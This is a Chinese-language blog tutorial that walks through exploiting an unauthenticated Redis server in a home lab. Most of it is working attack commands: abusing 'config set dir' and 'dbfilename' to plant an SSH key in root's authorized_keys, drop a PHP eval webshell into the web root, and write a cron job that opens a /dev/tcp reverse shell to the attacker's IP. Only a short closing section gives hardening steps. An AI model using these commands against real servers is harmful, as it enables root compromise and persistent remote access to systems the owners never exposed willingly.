初识redis未授权漏洞
2022-03-10 20:18:30

环境配置

攻击机：kali 192.168.88.134

靶机：ubuntu 192.168.88.130

首先在kali和ubuntu上安装redis

wget http://download.redis.io/releases/redis-3.2.9.tar.gz

kali直接解压 tar -zxvf redis-3.2.9.tar.gz即可

Ubuntu

(1) 先解压：

tar -zxvf  redis-3.2.9.tar.gz

(2) 重命名redis并移动到 /usr/local/redis

mv redis-3.2.9 /usr/local/redis

(3) 编译安装redis

make&make install

Redis3默认是出于保护机制的，只能本地访问，所以需要将其修改。

进入redis.conf文件中进行修改

vim /usr/local/redis/redis.conf

注释掉本地环回地址（redis默认只能是本地登录）

#bind 127.0.0.1

关闭保护模式

Protected-mode no

然后保存并退出

重新启动配置文件并执行

cd /usr/local/redis

redis-server redis.conf

查看redis是否启动

ps -ef | grep -i redis

有redis-server说明服务启动

如果需要关闭服务

kill -9 pid

（非正常关闭）

./bin/redis-cli shutdown

（正常关闭）

查看防火墙状态（需要关闭防火墙，不然不能远程连接,如果没有关闭，关闭即可）

systemctl status firewalld
sudo ufw status

漏洞利用

原理：

ssh-keygen -t RSA 生成密钥对

将公钥发送到远程主机，将公钥保存在/root/.ssh/authorized_keys 文件中

用户使用ssh user@host命令对远程主机发起登陆；

远程主机对用户返回一个随机串；

用户所在主机使用私钥对这个随机串进行加密，并将加密的随机串返回至远程主机；

远程主机使用分发过来的公钥对加密随机串进行解密；

如果解密成功，就证明用户的登陆信息是正确的，则允许登陆；否则反之。

kali连接redis服务器

redis-cli -h 192.168.88.130

输入info查看信息，如果显示详细信息则说明未授权登录成功

kali上生成rsa公钥

ssh-keygen -t 

将生成的rsa公钥写入文件（\n是用来换行，避免和redis里其他缓存数据混合在一起）

(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > hack.txt

把hack.txt写入到redis缓冲中

cat hack.txt | redis-cli -h 192.168.88.130 -p 6379 -x set crackit

连接redis

redis-cli -h 192.168.88.130

设置redis的dump文件默认路径为/root/.ssh,因为root用户的秘钥保存在/root/.ssh

config set dir /root/.ssh

并设置保存key的文件为authorized.keys(该文件时redis登录时key的默认保存文件)

config set dbfilename authorized_keys

保存并退出

save

exit


接着用kali通过ssh服务以root权限连接靶机

ssh root@192.168.88.130 -i /.ssh/id_rsa

Your identification has been saved in /root/.ssh/id_rsa,这是我们登录的验证的私钥，所以要用id_rsa去验证

写入一句话木马拿webshell （在网站目录下写入木马）

执行一下命令

./redis-cli -h 192.168.192.181

config set dir /var/www/html set x "\n\n\n<?php @eval($_POST['cmd']);?>\n\n\n"

config set dbfilename 1.php

save

然后用蚁剑连接拿到webshell

  * 利用redis以root权限运行时写crontab

利用crontab定时启动反弹shell

攻击机监听一个端口：nc -lvnp 5555

连接redis写入反弹shell

set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.10.140/5555 0>&1\n\n"

config set dir /var/spool/cron

config set dbfilename root

save

因为我是在ubuntu上测试的，写入成功但是不执行（centOS上可以）

遇到的问题

因为我的靶机ubuntu以前没有安装过ssh服务，所以首先需要安装ssh服务

apt-get install ssh

启动ssh服务

sudo /etc/init.d/ssh start

修改配置文件

sudo vim /etc/ssh/sshd_config

找到PermitRootLogin without-password 修改为PermitRootLogin yes

重启ssh服务

service ssh restart

安装之后在配置目录时显示找不到目录（我们可以在攻击机上创建文件，但是不能创建目录/root/.ssh,所以必须要先以root权限使用过ssh后会自动生成/root/.ssh目录），所以我用xshell以root权限连接靶机后生成了该目录。

ssh localhost
yes

输入密码，然后就会有该目录，cd /root/.ssh

如果在使用xshell连接时显示ssh服务器拒绝密码

检查虚拟机SSH服务是否开启：
service sshd status，如果没有开启，请执行service sshd start启动该服务，或者通过service sshd restart重启该服务；

检测22端口是否开放

修复方法

 1. 禁止以root权限登录redis
 2. 设置redis服务器的ip白名单
 3. 禁止外部访问redis服务
bind 127.0.0.1

禁止一些高危命令

rename-command FLUSHALL ""

 rename-command CONFIG ""

 rename-command EVAL ""

redis添加密码验证

修改redis.conf 添加requirepass mypassword
